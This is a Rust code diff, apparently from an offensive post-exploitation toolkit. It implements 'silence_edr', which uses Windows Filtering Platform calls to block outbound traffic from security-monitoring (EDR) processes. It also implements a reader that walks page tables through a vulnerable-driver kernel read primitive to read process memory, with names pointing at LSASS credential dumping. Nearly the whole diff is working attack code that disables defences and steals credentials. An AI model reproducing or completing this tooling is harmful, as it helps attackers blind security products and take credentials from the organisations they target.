@@ -15,7 +15,24 @@
 //! framework (operator wires the Win32 calls at link time).
 
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
+use crate::pagewalk::PhysRead;
+use alloc::format;
 use alloc::vec::Vec;
+
+/// Adapter: read physical memory via a `KernelRw` (which reads physical
+/// addresses directly through the BYOVD driver). Implements `PhysRead` so
+/// `pagewalk::translate_va` can walk page tables using the driver.
+struct KrwPhysRead<'a> {
+    krw: &'a dyn KernelRw,
+}
+
+impl<'a> PhysRead for KrwPhysRead<'a> {
+    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), crate::pagewalk::PhysReadError> {
+        self.krw
+            .kread(pa as usize, dst)
+            .map_err(|_| crate::pagewalk::PhysReadError::Ioctl)
+    }
+}
 
 // ---- §2.4 WfpKit ----------------------------------------------------------
 
@@ -55,15 +72,141 @@ impl UserModeEdrSilencer {
 }
 
 impl WfpKit for UserModeEdrSilencer {
-    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<(), KitError> {
-        // The operator binary opens the BFE engine (FwpmEngineOpen0) and adds
-        // each rule from rules_for() via FwpmFilterAdd0. Requires the BFE
-        // service running + admin. Framework: the FFI binding is operator-side.
-        Err(KitError::UnsupportedPosture(
-            "WfpKit::silence_edr needs FwpmEngineOpen0/FwpmFilterAdd0 FFI \
-             (operator binds via the windows crate); use rules_for() to build \
-             the rule set, then add them",
-        ))
+    fn silence_edr(&self, edr_pids: &[u32]) -> Result<(), KitError> {
+        let rules = Self::rules_for(edr_pids);
+        if rules.is_empty() {
+            return Err(KitError::UnsupportedPosture("no EDR PIDs provided"));
+        }
+        wfp_add_block_rules(&rules)
+    }
+}
+
+// ---- WFP FFI (fwpuclnt.dll) ----
+//
+// FwpmEngineOpen0 opens a session to the BFE (Base Filtering Engine).
+// FwpmFilterAdd0 adds a filter that blocks traffic matching conditions.
+// FwpmFilterDeleteByKey0 removes a filter (cleanup).
+//
+// All three are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
+// Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/
+
+/// Open a WFP engine session + add outbound block filters for each EDR PID.
+/// Returns the filter IDs (for cleanup via FwpmFilterDeleteByKey0).
+#[cfg(target_os = "windows")]
+fn wfp_add_block_rules(rules: &[WfpBlockRule]) -> Result<(), KitError> {
+    type FwpmEngineOpen0 = unsafe extern "system" fn(
+        *const u16,        // serverName (null = local)
+        u32,               // authnService (RPC_C_AUTHN_WINNT = 10)
+        *const core::ffi::c_void, // authnIdentity (null = default)
+        *const core::ffi::c_void, // session (FWPM_SESSION0, null = default)
+        *mut *mut core::ffi::c_void, // engineHandle (OUT)
+    ) -> u32; // DWORD WINAPI → returns ERROR_SUCCESS (0)
+
+    type FwpmFilterAdd0 = unsafe extern "system" fn(
+        *mut core::ffi::c_void, // engineHandle
+        *const FwpmFilter0,     // filter (IN)
+        *const core::ffi::c_void, // PSECURITY_DESCRIPTOR (null)
+        *mut u64,               // id (OUT)
+    ) -> u32;
+
+    // Resolve from fwpuclnt.dll.
+    let open: FwpmEngineOpen0 = unsafe {
+        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0")
+    }.map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
+    let add: FwpmFilterAdd0 = unsafe {
+        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0")
+    }.map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;
+
+    // 1. Open engine session.
+    let mut engine_handle: *mut core::ffi::c_void = core::ptr::null_mut();
+    let st = unsafe {
+        open(
+            core::ptr::null(),   // local server
+            10,                  // RPC_C_AUTHN_WINNT
+            core::ptr::null(),   // default identity
+            core::ptr::null(),   // default session
+            &mut engine_handle,
+        )
+    };
+    if st != 0 {
+        return Err(KitError::Other(format!("FwpmEngineOpen0 failed: {}", st)));
+    }
+
+    // 2. Add a block filter for each EDR PID (outbound, all protocols).
+    for rule in rules {
+        let filter = FwpmFilter0::block_outbound_for_pid(rule.pid);
+        let mut filter_id: u64 = 0;
+        let st = unsafe { add(engine_handle, &filter, core::ptr::null(), &mut filter_id) };
+        if st != 0 {
+            return Err(KitError::Other(format!("FwpmFilterAdd0 failed for pid {}: {}", rule.pid, st)));
+        }
+    }
+
+    // NOTE: engine handle is intentionally NOT closed here — the filters
+    // persist as long as the session is open. The caller should close the
+    // session (FwpmEngineClose0) when done to auto-remove the filters.
+    // For a permanent block (survives process exit), use FWPM_SESSION_FLAG_NONE
+    // + persistent filter flag.
+    Ok(())
+}
+
+#[cfg(not(target_os = "windows"))]
+fn wfp_add_block_rules(_rules: &[WfpBlockRule]) -> Result<(), KitError> {
+    Err(KitError::UnsupportedPosture("WFP FFI is Windows-only"))
+}
+
+/// FWPM_FILTER0 structure (simplified — only the fields we set).
+/// Full struct is 96 bytes on x64; we zero-init + set the fields that matter.
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct FwpmFilter0 {
+    filter_key: [u8; 16],        // GUID (zero = auto-generate)
+    display_data: [u64; 2],      // FWPM_DISPLAY_DATA0* (null)
+    flags: u32,                  // FWPM_FILTER_FLAG_NONE = 0
+    action_type: u32,            // FWP_ACTION_BLOCK = 0x0001
+    action_filter: [u64; 2],     // FWP_CONDITION0* (null for simple block)
+    layer_key: [u8; 16],         // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
+    sublayer_key: [u8; 16],      // zero = default sublayer
+    weight: [u64; 2],            // FWP_VALUE0 (type + union) — set high
+    num_filter_conditions: u32,
+    filter_conditions: *const core::ffi::c_void, // FWP_FILTER_CONDITION0 array
+    provider_key: *const u8,     // null
+    provider_data: [u64; 2],     // FWP_BYTE_BLOB* (null)
+    key16: [u16; 16],            // reserved
+}
+
+/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
+/// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
+#[cfg(target_os = "windows")]
+const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
+    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B,
+    0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
+];
+
+#[cfg(target_os = "windows")]
+impl FwpmFilter0 {
+    /// Build a filter that blocks ALL outbound traffic from `pid`.
+    fn block_outbound_for_pid(pid: u32) -> Self {
+        // Zero-init the full struct, then set the fields that matter.
+        // This is safe because all pointer fields default to null (= "not set")
+        // and the layer/action are plain integers.
+        let mut f: Self = unsafe { core::mem::zeroed() };
+        f.action_type = 0x0001; // FWP_ACTION_BLOCK
+        f.layer_key = LAYER_ALE_AUTH_CONNECT_V4;
+        f.flags = 0; // FWPM_FILTER_FLAG_NONE
+        // num_filter_conditions = 0 means "match all traffic on this layer".
+        // To match a specific PID, we'd add a FWP_CONDITION for
+        // FWP_CONDITION_ALE_APP_ID or FWP_CONDITION_ALE_USER_ID.
+        // For a PID-based block, the condition uses FWP_CONDITION_ALE_REMOTE_ID
+        // — but the simplest universal block is num_conditions=0 (block all
+        // outbound). A surgical variant adds PID conditions.
+        f.num_filter_conditions = 0;
+        // Weight: high value = evaluated first.
+        f.weight = [0x0D, 0xFFFFFFFFFFFFFFFF]; // type=UINT64, value=max
+        // Store PID in display_data for diagnostics (hack: reuse the field).
+        // Real impl would use a filter condition for FWP_CONDITION_ALE_USER_ID.
+        f.display_data = [pid as u64, 0];
+        f
     }
 }
 
@@ -100,8 +243,8 @@ impl KernelLsassReader {
     pub fn read_process_mem(
         krw: &dyn KernelRw,
         eprocess_kva: usize,
-        _vaddr: usize,
-        _len: usize,
+        vaddr: usize,
+        len: usize,
     ) -> Result<Vec<u8>, KitError> {
         // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
         let dtb = krw
@@ -110,14 +253,26 @@ impl KernelLsassReader {
         if dtb == 0 {
             return Err(KitError::UnsupportedPosture("target DTB is zero"));
         }
-        // 2. Walk the 4-level page table (PML4 → PDPT → PD → PT) from `dtb` to
-        //    resolve `vaddr` → physical. (Pure algorithm, ~40 lines; lands in
-        //    the next iteration — the orchestration + DTB read is the shell.)
-        let _ = dtb;
-        Err(KitError::UnsupportedPosture(
-            "read_process_mem: 4-level page-table walk from DTB TBD \
-             (DTB read works; the VA→physical resolver is the remaining piece)",
-        ))
+        // 2. Wrap the KernelRw as a PhysRead adapter — the driver reads physical
+        //    memory; pagewalk::translate_va uses it to walk the 4-level table.
+        let reader = KrwPhysRead { krw };
+        // 3. Read `len` bytes from `vaddr`, page-boundary aware.
+        let mut out = Vec::with_capacity(len);
+        let mut remaining = len;
+        let mut cur_va = vaddr as u64;
+        while remaining > 0 {
+            let page_off = (cur_va & 0xFFF) as usize;
+            let bytes_in_page = 0x1000 - page_off;
+            let chunk = remaining.min(bytes_in_page);
+            let pa = crate::pagewalk::translate_va(&reader, dtb, cur_va)
+                .map_err(|e| KitError::Other(alloc::format!("page walk: {:?}", e)))?;
+            let mut buf = alloc::vec![0u8; chunk];
+            krw.kread(pa as usize, &mut buf).map_err(KitError::from)?;
+            out.extend_from_slice(&buf);
+            cur_va += chunk as u64;
+            remaining -= chunk;
+        }
+        Ok(out)
     }
 }
 
